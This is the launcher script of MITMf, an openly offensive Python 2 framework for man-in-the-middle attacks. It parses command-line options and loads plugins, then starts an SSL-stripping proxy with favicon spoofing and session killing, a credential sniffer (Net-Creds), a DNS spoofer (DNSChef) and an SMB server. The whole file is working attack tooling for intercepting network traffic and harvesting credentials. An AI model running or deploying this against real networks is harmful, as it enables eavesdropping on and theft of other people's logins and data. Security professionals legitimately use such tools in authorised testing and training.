#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import argparse
import sys
import os
import logging
import threading

from twisted.web import http
from twisted.internet import reactor
from core.sslstrip.CookieCleaner import CookieCleaner
from core.sergioproxy.ProxyPlugins import ProxyPlugins
from core.utils import Banners, SystemConfig
from plugins import *

Banners().printBanner()

if os.geteuid() != 0:
    sys.exit("[-] When man-in-the-middle you want, run as r00t you will, hmm?")

mitmf_version = "0.9.7"
sslstrip_version = "0.9"
sergio_version = "0.2.1"
dnschef_version = "0.4"
netcreds_version = "1.0"

parser = argparse.ArgumentParser(description="MITMf v{} - Framework for MITM attacks".format(mitmf_version), version=mitmf_version, usage='mitmf.py -i interface [mitmf options] [plugin name] [plugin options]', epilog="Use wisely, young Padawan.",fromfile_prefix_chars='@')

#add MITMf options
mgroup = parser.add_argument_group("MITMf", "Options for MITMf")
mgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level [default: info]")
mgroup.add_argument("-i", "--interface", required=True, type=str,  metavar="interface" ,help="Interface to listen on")
mgroup.add_argument("-c", "--config-file", dest='configfile', type=str, default="./config/mitmf.conf", metavar='configfile', help="Specify config file to use")
mgroup.add_argument('-m', '--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')

#add sslstrip options
sgroup = parser.add_argument_group("SSLstrip", "Options for SSLstrip library")
slogopts = sgroup.add_mutually_exclusive_group()
slogopts.add_argument("-p", "--post", action="store_true",help="Log only SSL POSTs. (default)")
slogopts.add_argument("-s", "--ssl", action="store_true", help="Log all SSL traffic to and from server.")
slogopts.add_argument("-a", "--all", action="store_true", help="Log all SSL and HTTP traffic to and from server.")
sgroup.add_argument("-l", "--listen", type=int, metavar="port", default=10000, help="Port to listen on (default 10000)")
sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")

#Initialize plugins
plugin_classes = plugin.Plugin.__subclasses__()

plugins = []
try:
    for p in plugin_classes:
        plugins.append(p())
except Exception as e:
    print "[-] Failed to load plugin class {}: {}".format(p, e)

#Give subgroup to each plugin with options
try:
    for p in plugins:
        if p.desc == "":
            sgroup = parser.add_argument_group(p.name,"Options for {}.".format(p.name))
        else:
            sgroup = parser.add_argument_group(p.name, p.desc)

        sgroup.add_argument("--{}".format(p.optname), action="store_true",help="Load plugin {}".format(p.name))

        if p.has_opts:
            p.add_options(sgroup)
except NotImplementedError:
    sys.exit("[-] {} plugin claimed option support, but didn't have it.".format(p.name))

if len(sys.argv) is 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

#first check to see if we supplied a valid interface
myip  = SystemConfig.getIP(args.interface)
mymac = SystemConfig.getMAC(args.interface)

#Start logging 
log_level = logging.__dict__[args.log_level.upper()]

logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
logFormatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
mitmf_logger = logging.getLogger('mitmf')
fileHandler = logging.FileHandler("./logs/mitmf.log")
fileHandler.setFormatter(logFormatter)
mitmf_logger.addHandler(fileHandler)

#####################################################################################################

#All our options should be loaded now, initialize the plugins
print "[*] MITMf v{} online... initializing plugins".format(mitmf_version)

load = []

for p in plugins:

    #load only the plugins that have been called at the command line
    if vars(args)[p.optname] is True:

        print "|_ {} v{}".format(p.name, p.version)
        if hasattr(p, 'tree_output') and p.tree_output:
            for line in p.tree_output:
                print "|  |_ {}".format(line)
                p.tree_output.remove(line)

        p.initialize(args)

        if hasattr(p, 'tree_output') and p.tree_output:
            for line in p.tree_output:
                print "|  |_ {}".format(line)

        load.append(p)

#Plugins are ready to go, let's rock & roll
from core.sslstrip.StrippingProxy import StrippingProxy
from core.sslstrip.URLMonitor import URLMonitor

URLMonitor.getInstance().setFaviconSpoofing(args.favicon)

CookieCleaner.getInstance().setEnabled(args.killsessions)
ProxyPlugins.getInstance().setPlugins(load)

strippingFactory              = http.HTTPFactory(timeout=10)
strippingFactory.protocol     = StrippingProxy

reactor.listenTCP(args.listen, strippingFactory)

for p in load:

    p.pluginReactor(strippingFactory) #we pass the default strippingFactory, so the plugins can use it
    p.startConfigWatch()

    t = threading.Thread(name='{}-thread'.format(p.name), target=p.startThread, args=(args,))
    t.setDaemon(True)
    t.start()

print "|"
print "|_ Sergio-Proxy v{} online".format(sergio_version)
print "|_ SSLstrip v{} by Moxie Marlinspike online".format(sslstrip_version)

#Start Net-Creds
from core.netcreds.NetCreds import NetCreds
NetCreds().start(args.interface, myip)
print "|_ Net-Creds v{} online".format(netcreds_version)

#Start DNSChef
from core.dnschef.DNSchef import DNSChef
DNSChef.getInstance().start()
print "|_ DNSChef v{} online".format(dnschef_version)

#start the SMB server
from core.protocols.smb.SMBserver import SMBserver
from impacket import version
print "|_ SMBserver online (Impacket {})\n".format(version.VER_MINOR)
SMBserver().start()

#start the reactor
reactor.run()

print "\n"
#run each plugins finish() on exit
for p in load:
    p.finish()
